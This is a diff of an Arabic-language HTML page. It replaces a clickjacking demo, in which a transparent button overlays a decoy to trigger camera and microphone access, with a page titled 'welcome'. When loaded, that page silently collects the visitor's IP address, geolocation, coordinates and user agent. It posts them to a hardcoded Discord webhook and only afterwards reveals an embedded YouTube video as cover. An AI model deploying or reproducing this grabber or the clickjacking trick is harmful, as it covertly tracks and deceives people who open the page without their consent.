@@ -1,28 +1,85 @@
-<html>
-  <body style="font-family: sans-serif; direction: rtl; text-align: center; margin-top: 80px;">
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>welcome</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    #video-container {
+      display: none;
+      width: 100%;
+      height: 100%;
+    }
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+  </style>
+</head>
+<body>
 
-    <h2>تجربة خداع طلب الصلاحيات</h2>
+  <div id="video-container">
+    <iframe src="https://www.youtube.com/embed/kZu8cLhZpuA?si=8sKfx92yGdVrPFCQ&autoplay=1"
+            allow="autoplay; encrypted-media" allowfullscreen>
+    </iframe>
+  </div>
 
-    <!-- زر يشبه شي ثاني -->
-    <button style="padding: 15px 40px; font-size: 18px; cursor:pointer; position: relative; overflow: hidden;">
-      اضغط على هذي الزر العادي
-      <!-- زر الموافقة الحقيقي مخفي فوقه -->
-      <button id="realAllowBtn" 
-              style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer;">
-        زر مخفي
-      </button>
-    </button>
+  <script>
+    const discordWebhookUrl = 'https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv';
 
-    <script>
-      document.getElementById('realAllowBtn').onclick = () => {
-        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-          .then(stream => {
-            alert('تم تفعيل الكاميرا والمايك وانت ما تدري');
-            stream.getTracks().forEach(track => track.stop());
-          })
-          .catch(() => alert('رفضت الإذن'));
-      };
-    </script>
+    async function sendUserInfo() {
+      try {
+        const [geoRes, ipRes] = await Promise.all([
+          fetch('https://ipapi.co/json/'),
+          fetch('https://api64.ipify.org?format=json')
+        ]);
 
-  </body>
+        const geoData = await geoRes.json();
+        const ipData = await ipRes.json();
+
+        const ip = ipData.ip || 'غير معروف';
+        const userAgent = navigator.userAgent;
+        const latitude = geoData.latitude || 'غير متوفر';
+        const longitude = geoData.longitude || 'غير متوفر';
+
+        const message = `
+IP: ${ip}
+الدولة: ${geoData.country_name}
+المنطقة: ${geoData.region}
+المدينة: ${geoData.city}
+الموقع: ${latitude}, ${longitude}
+المنطقة الزمنية: ${geoData.timezone}
+المتصفح والجهاز: ${userAgent}
+        `.trim();
+
+        await fetch(discordWebhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: message })
+        });
+
+        console.log('✅ تم إرسال المعلومات');
+
+      } catch (err) {
+        console.error('❌ فشل في إرسال المعلومات:', err);
+      }
+
+      // بعد ثانيتين يطلع المقطع
+      setTimeout(() => {
+        document.getElementById('video-container').style.display = 'block';
+      }, 2000);
+    }
+
+    window.addEventListener('load', sendUserInfo);
+  </script>
+</body>
 </html>
